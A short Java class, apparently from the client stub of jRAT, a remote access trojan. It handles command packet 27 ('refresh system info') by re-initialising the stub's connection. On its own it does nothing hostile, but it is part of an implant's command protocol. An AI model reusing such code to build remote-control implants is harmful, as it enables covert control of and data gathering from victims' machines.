package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;

public class Packet27RefreshSystemInfo extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Connection.initialize();
	}

}
